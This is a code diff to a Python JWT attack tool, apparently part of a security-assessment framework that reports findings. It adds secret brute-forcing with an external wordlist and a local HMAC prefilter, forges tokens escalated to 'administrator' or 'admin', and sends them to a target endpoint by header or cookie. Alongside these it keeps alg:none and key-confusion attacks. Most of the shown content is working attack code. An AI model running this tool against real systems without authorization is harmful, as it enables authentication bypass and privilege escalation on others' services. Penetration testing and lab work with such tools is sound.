@@ -15,8 +15,11 @@ import base64
 import hashlib
 import hmac
 import json
+import math
+import os
 import ssl
 import sys
+import time
 import urllib.error
 import urllib.request
 from datetime import datetime, timezone
@@ -87,6 +90,7 @@ DEFAULT_WORDLIST = [
     "key",
     "token",
     "secret",
+    "secret1",
     "password",
     "admin",
     "test",
@@ -129,6 +133,32 @@ DEFAULT_WORDLIST = [
     "owasp",
     "bkimminich",
 ]
+
+# ---- Wordlist externo y transporte HTTP (configurable) --------------------
+
+# Directorio del propio handler (para resolver rutas relativas al módulo).
+_HANDLER_DIR = os.path.dirname(os.path.abspath(__file__))
+
+# Cascada de búsqueda del wordlist externo. Se prueba en orden:
+#   1) code/skills_controller/handlers/wordlists/jwt.secrets.list  (recomendado)
+#   2) jwt.secrets.list en la raíz del proyecto SECURE/
+#   3) jwt.secrets.list en el directorio actual de trabajo
+
+# Wordlist externo: wordlists/jwt.secrets.list
+# Fuente: https://github.com/wallarm/jwt-secrets  (Licencia MIT, ver wordlists/README.md)
+WORDLIST_CANDIDATES = [
+    os.path.join(_HANDLER_DIR, "wordlists", "jwt.secrets.list"),
+    os.path.join(_HANDLER_DIR, "..", "..", "..", "jwt.secrets.list"),
+    os.path.join(os.getcwd(), "jwt.secrets.list"),
+]
+
+# Transporte del JWT. Se sobreescribe vía --token-transport (o run_jwt_attack).
+#   "both"   → header Authorization + cookie session  (default, máxima compat)
+#   "header" → solo header Authorization
+#   "cookie" → solo cookie session
+_HTTP_TRANSPORT = "both"
+_HTTP_COOKIE_NAME = "session"
+
 
 # ---- JWT utilities (stdlib only) ------------------------------------------
 
@@ -193,8 +223,22 @@ def set_nested(d, path, value):
 
 
 def http(url, method="GET", headers=None, body=None, timeout=10):
+    headers = dict(headers or {})
+    auth = headers.get("Authorization", "")
+    if auth.startswith("Bearer "):
+        token = auth[len("Bearer "):]
+        # "both" y "cookie" → enviar también en cookie
+        if _HTTP_TRANSPORT in ("both", "cookie"):
+            headers.setdefault("Cookie", f"{_HTTP_COOKIE_NAME}={token}")
+        # "cookie" → quitar header (el server podría rechazarlo)
+        if _HTTP_TRANSPORT == "cookie":
+            headers.pop("Authorization", None)
+    # "header" → quitar cookie si venía
+    elif _HTTP_TRANSPORT == "header":
+        headers.pop("Cookie", None)
+
     req = urllib.request.Request(url, method=method)
-    for k, v in (headers or {}).items():
+    for k, v in headers.items():
         req.add_header(k, v)
     if body is not None:
         req.data = body.encode() if isinstance(body, str) else body
@@ -223,6 +267,84 @@ def forge_alg_none(payload):
     h = b64e(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
     p = b64e(json.dumps(payload, separators=(",", ":")).encode())
     return f"{h.decode()}.{p.decode()}."
+
+
+def verify_hs256(token, secret):
+    """Verifica si `secret` es la clave HMAC-SHA256 que firmó `token`.
+
+    Uso principal: PRE-FILTRO LOCAL en el brute force. Si un candidato no
+    reproduce la firma del token original, no puede ser el secreto correcto
+    y evitamos hacer una petición HTTP innecesaria al servidor.
+    """
+    try:
+        parts = token.split(".")
+        if len(parts) != 3:
+            return False
+        signing_input = f"{parts[0]}.{parts[1]}".encode()
+        expected = (
+            base64.urlsafe_b64encode(
+                hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
+            )
+            .rstrip(b"=")
+            .decode()
+        )
+        return hmac.compare_digest(expected, parts[2])
+    except Exception:
+        return False
+
+
+def _read_wordlist_file(path):
+    """Lee un archivo de wordlist: una palabra por línea, sin vacías, sin duplicados."""
+    seen = set()
+    result = []
+    try:
+        with open(path, encoding="utf-8", errors="ignore") as f:
+            for line in f:
+                word = line.strip()
+                if word and word not in seen:
+                    seen.add(word)
+                    result.append(word)
+    except OSError as exc:
+        print(f"[jwt_tool_handler] No se pudo leer wordlist '{path}': {exc}", file=sys.stderr)
+    return result
+
+
+def load_wordlist(path=None):
+    """Carga el wordlist con cascada de fallbacks.
+
+    Prioridad:
+      1. Argumento explícito `path` (CLI --wordlist)
+      2. WORDLIST_CANDIDATES (primero el primero que exista y no esté vacío)
+      3. DEFAULT_WORDLIST hardcodeado
+
+    Retorna (words, source). `source` es una etiqueta para el JSON:
+    "cli", "file:<ruta>" o "builtin".
+    """
+    if path:
+        words = _read_wordlist_file(path)
+        if words:
+            return words, "cli"
+        print(
+            f"[jwt_tool_handler] Wordlist '{path}' vacío o ilegible, usando fallback",
+            file=sys.stderr,
+        )
+
+    for candidate in WORDLIST_CANDIDATES:
+        if os.path.isfile(candidate):
+            words = _read_wordlist_file(candidate)
+            if words:
+                print(
+                    f"[jwt_tool_handler] Wordlist cargado: {candidate} " f"({len(words)} entradas)",
+                    file=sys.stderr,
+                )
+                return words, f"file:{candidate}"
+
+    print(
+        f"[jwt_tool_handler] Wordlist externo no encontrado; usando DEFAULT_WORDLIST "
+        f"({len(DEFAULT_WORDLIST)} entradas)",
+        file=sys.stderr,
+    )
+    return list(DEFAULT_WORDLIST), "builtin"
 
 
 def forge_hs256(payload, secret_bytes):
@@ -350,30 +472,90 @@ def attack_key_confusion(endpoint, decoded, customer_token, base):
     }
 
 
-def attack_weak_secret(endpoint, decoded, customer_token, wordlist=None):
+def attack_weak_secret(
+    endpoint,
+    decoded,
+    customer_token,
+    wordlist=None,
+    max_attempts=0,
+    use_prefilter=True,
+    wordlist_source="builtin",
+):
     wordlist = wordlist or DEFAULT_WORDLIST
+    base = decoded["payload"].copy()
+
+    # Variante 1: sub -> administrator (el caso de PortSwigger y similares)
+    v_sub_admin = base.copy()
+    if "sub" in v_sub_admin:
+        v_sub_admin["sub"] = "administrator"
+
+    # Variante 2: role/scope -> admin (apps con claim de rol)
+    v_role = base.copy()
+    role_path, _ = find_role_path(v_role)
+    if role_path:
+        set_nested(v_role, role_path, "admin")
+
+    # Variante 3: sub -> admin (fallback genérico)
+    v_sub_generic = base.copy()
+    if "sub" in v_sub_generic:
+        v_sub_generic["sub"] = "admin"
+
+    variants = [v_sub_admin, v_role, v_sub_generic]
+
+    prefiltered = 0
+    tested = 0
+    started = time.monotonic()
+
     for guess in wordlist:
-        payload = decoded["payload"].copy()
-        role_path, _ = find_role_path(payload)
-        if role_path:
-            set_nested(payload, role_path, "admin")
-        forged = forge_hs256(payload, guess.encode())
-        r = http(endpoint, headers={"Authorization": f"Bearer {forged}"})
-        if r["status"] == 200:
-            validation = validate_attack(endpoint, forged, customer_token)
-            return {
-                "attempted": True,
-                "success": True,
-                "reason": "weak_secret_cracked",
-                "cracked_secret": guess,
-                "validation": validation,
-            }
-    return {
+        if max_attempts and tested >= max_attempts:
+            break
+
+        # ── Pre-filtro LOCAL: ¿el guess firma realmente el token original? ──
+        # Un candidato que no reproduce la firma NO puede ser el secreto.
+        # Ahorra N×3 requests → solo unos pocos al servidor.
+        if use_prefilter and not verify_hs256(customer_token, guess):
+            prefiltered += 1
+            continue
+
+        tested += 1
+        for payload in variants:
+            forged = forge_hs256(payload, guess.encode())
+            r = http(endpoint, headers={"Authorization": f"Bearer {forged}"})
+            if r["status"] == 200:
+                validation = validate_attack(endpoint, forged, customer_token)
+                duration = round(time.monotonic() - started, 3)
+                return {
+                    "attempted": True,
+                    "success": True,
+                    "reason": "weak_secret_cracked",
+                    "cracked_secret": guess,
+                    "attempts": tested,
+                    "prefiltered": prefiltered,
+                    "duration_seconds": duration,
+                    "attempts_per_second": round(tested / duration, 2) if duration > 0 else None,
+                    "wordlist_source": wordlist_source,
+                    "forged_payload": payload,
+                    "validation": validation,
+                }
+
+    duration = round(time.monotonic() - started, 3)
+    result = {
         "attempted": True,
         "success": False,
         "reason": "no_weak_secret_found",
-        "attempts": len(wordlist),
+        "attempts": tested,
+        "prefiltered": prefiltered,
+        "duration_seconds": duration,
+        "wordlist_size": len(wordlist),
+        "wordlist_source": wordlist_source,
     }
+    if use_prefilter and tested == 0 and prefiltered > 0:
+        result["warning"] = (
+            "prefilter_rejected_all_candidates: el token provisto no fue firmado por "
+            "ninguna entrada del wordlist. Reintenta con --no-prefilter si sospechas "
+            "que el token fue alterado en tránsito."
+        )
+    return result
 
 
 # ---- Analysis + findings --------------------------------------------------
@@ -382,6 +564,13 @@ def attack_weak_secret(endpoint, decoded, customer_token, wordlist=None):
 def analyze_jwt(decoded, token):
     h, p = decoded["header"], decoded["payload"]
     alg = h.get("alg", "unknown")
+    exp = p.get("exp")
+    if isinstance(exp, (int, float)) and not isinstance(exp, bool) and math.isfinite(exp):
+        expires_in_seconds = exp - time.time()
+        is_expired = expires_in_seconds <= 0
+    else:
+        expires_in_seconds = None
+        is_expired = None
     role_path, role_val = find_role_path(p)
     sensitive = find_sensitive(p)
 
@@ -424,6 +613,8 @@ def analyze_jwt(decoded, token):
         "algorithm_family": "asymmetric" if alg.startswith(("RS", "PS", "ES")) else "symmetric",
         "claims_present": list(p.keys()),
         "claims_missing": [c for c in ["exp", "nbf", "iss", "aud", "sub", "jti"] if c not in p],
+        "expires_in_seconds": expires_in_seconds,
+        "is_expired": is_expired,
         "role_claim": {"path": role_path, "value": role_val} if role_path else None,
         "sensitive_claims": sensitive,
         "weaknesses": weaknesses,
@@ -670,7 +861,7 @@ def consolidate_findings(analysis, attacks, discovery):
 
     if attacks.get("weak_secret", {}).get("success"):
         cracked = attacks["weak_secret"]["cracked_secret"]
-        attempts = attacks["weak_secret"].get("attempts")
+        attempts = attacks["weak_secret"].get("attempts") or "N/D"
         findings.append(
             {
                 "id": f"A07-{len(findings)+1:02d}",
@@ -699,11 +890,70 @@ def consolidate_findings(analysis, attacks, discovery):
     return findings
 
 
+def _empty_summary():
+    return {
+        "total_findings": 0,
+        "critical": 0,
+        "high": 0,
+        "medium": 0,
+        "low": 0,
+        "risk_level": "NONE",
+        "attacks_succeeded": 0,
+    }
+
+
+def _with_execution(result, started_at, started_monotonic):
+    finished_at = datetime.now(timezone.utc)
+    result["execution"] = {
+        "started_at": started_at.isoformat(),
+        "finished_at": finished_at.isoformat(),
+        "duration_seconds": round(max(0.0, time.monotonic() - started_monotonic), 6),
+    }
+    return result
+
+
 # ---- Main orchestrator ----------------------------------------------------
 
 
-def run_jwt_attack(target, token, test_endpoint=None):
+def run_jwt_attack(
+    target,
+    token,
+    test_endpoint=None,
+    wordlist=None,
+    max_attempts=0,
+    use_prefilter=True,
+    transport="both",
+):
+    global _HTTP_TRANSPORT
+    _HTTP_TRANSPORT = transport
+
+    started_at = datetime.now(timezone.utc)
+    started_monotonic = time.monotonic()
     decoded = decode_jwt(token)
+    exp = decoded["payload"].get("exp")
+    now = time.time()
+    warnings = []
+
+    if isinstance(exp, (int, float)) and not isinstance(exp, bool) and math.isfinite(exp):
+        if exp <= now:
+            analysis = analyze_jwt(decoded, token)
+            return _with_execution({
+                "tool": "jwt_tool_handler",
+                "version": "1.0.0",
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+                "target": target,
+                "discovery": None,
+                "jwt_analysis": analysis,
+                "attacks": {},
+                "findings": [],
+                "summary": _empty_summary(),
+                "error": "token_expired",
+                "exp": exp,
+                "hint": "Obtén un token fresco",
+            }, started_at, started_monotonic)
+        if exp - now < 300:
+            warnings.append("token_expires_soon")
+
     analysis = analyze_jwt(decoded, token)
 
     if test_endpoint:
@@ -712,22 +962,24 @@ def run_jwt_attack(target, token, test_endpoint=None):
         disc = discover_test_endpoint(target, token)
         if not disc:
             findings = consolidate_findings(analysis, {}, {})
-            severities = [finding["severity"] for finding in findings]
+            severities = [f["severity"] for f in findings]
             risk = (
                 "CRITICAL"
                 if "CRITICAL" in severities
-                else (
-                    "HIGH"
-                    if "HIGH" in severities
-                    else "MEDIUM" if "MEDIUM" in severities else "LOW" if severities else "NONE"
-                )
+                else ("HIGH" if "HIGH" in severities
+                      else "MEDIUM" if "MEDIUM" in severities
+                      else "LOW" if severities else "NONE")
             )
-            return {
+            result = {
                 "tool": "jwt_tool_handler",
+                "version": "1.0.0",
+                "timestamp": datetime.now(timezone.utc).isoformat(),
                 "target": target,
+                "discovery": None,
                 "error": "no_test_endpoint_found",
                 "hint": "Provide --test-endpoint or ensure target has a 401-protected path",
                 "jwt_analysis": analysis,
+                "attacks": {},
                 "findings": findings,
                 "summary": {
                     "total_findings": len(findings),
@@ -739,6 +991,9 @@ def run_jwt_attack(target, token, test_endpoint=None):
                     "attacks_succeeded": 0,
                 },
             }
+            if warnings:
+                result["warnings"] = warnings
+            return _with_execution(result, started_at, started_monotonic)
         discovery = {"url": disc["url"], "path": disc["path"], "source": "auto_discovered"}
 
     attacks = {}
@@ -748,7 +1003,16 @@ def run_jwt_attack(target, token, test_endpoint=None):
     if alg.startswith(("RS", "PS", "ES")):
         attacks["key_confusion"] = attack_key_confusion(discovery["url"], decoded, token, target)
     elif alg.startswith("HS"):
-        attacks["weak_secret"] = attack_weak_secret(discovery["url"], decoded, token)
+        wl, wl_source = load_wordlist(wordlist)
+        attacks["weak_secret"] = attack_weak_secret(
+            discovery["url"],
+            decoded,
+            token,
+            wordlist=wl,
+            max_attempts=max_attempts,
+            use_prefilter=use_prefilter,
+            wordlist_source=wl_source,
+        )
 
     findings = consolidate_findings(analysis, attacks, discovery)
 
@@ -756,14 +1020,12 @@ def run_jwt_attack(target, token, test_endpoint=None):
     risk = (
         "CRITICAL"
         if "CRITICAL" in severities
-        else (
-            "HIGH"
-            if "HIGH" in severities
-            else "MEDIUM" if "MEDIUM" in severities else "LOW" if severities else "NONE"
-        )
+        else ("HIGH" if "HIGH" in severities
+              else "MEDIUM" if "MEDIUM" in severities
+              else "LOW" if severities else "NONE")
     )
 
-    return {
+    result = {
         "tool": "jwt_tool_handler",
         "version": "1.0.0",
         "timestamp": datetime.now(timezone.utc).isoformat(),
@@ -782,6 +1044,9 @@ def run_jwt_attack(target, token, test_endpoint=None):
             "attacks_succeeded": sum(1 for a in attacks.values() if a.get("success")),
         },
     }
+    if warnings:
+        result["warnings"] = warnings
+    return _with_execution(result, started_at, started_monotonic)
 
 
 # ---- CLI ------------------------------------------------------------------
@@ -793,20 +1058,53 @@ def main():
     ap.add_argument("--token", required=True, help="Original JWT to analyze/attack")
     ap.add_argument("--test-endpoint", help="Override auto-discovery (e.g. /api/Users/)")
     ap.add_argument("--output", help="Write JSON to file")
+    ap.add_argument(
+        "--wordlist",
+        help="Path to wordlist file (one secret per line). "
+             "Si se omite, se busca en wordlists/jwt.secrets.list y en la raíz del proyecto.",
+    )
+    ap.add_argument(
+        "--max-attempts", type=int, default=0,
+        help="Stop brute force after N server attempts (0 = unlimited)",
+    )
+    ap.add_argument(
+        "--no-prefilter", action="store_true",
+        help="Disable local HMAC pre-filter (sends ALL candidates to the server)",
+    )
+    ap.add_argument(
+        "--token-transport", choices=["both", "header", "cookie"], default="both",
+        help="How to send the JWT: both (default), header only, or cookie only",
+    )
     args = ap.parse_args()
 
+    started_at = datetime.now(timezone.utc)
+    started_monotonic = time.monotonic()
     try:
-        result = run_jwt_attack(args.target, args.token, args.test_endpoint)
+        result = run_jwt_attack(
+            args.target,
+            args.token,
+            args.test_endpoint,
+            wordlist=args.wordlist,
+            max_attempts=args.max_attempts,
+            use_prefilter=not args.no_prefilter,
+            transport=args.token_transport,
+        )
     except Exception as e:
         result = {
             "tool": "jwt_tool_handler",
             "version": "1.0.0",
             "timestamp": datetime.now(timezone.utc).isoformat(),
             "target": args.target,
+            "discovery": None,
+            "jwt_analysis": None,
+            "attacks": {},
+            "findings": [],
+            "summary": _empty_summary(),
             "error": type(e).__name__,
             "message": str(e),
             "hint": "Verify that --token is a valid JWT (header.payload.signature).",
         }
+        result = _with_execution(result, started_at, started_monotonic)
 
     json_str = json.dumps(result, indent=2)
     print(json_str)
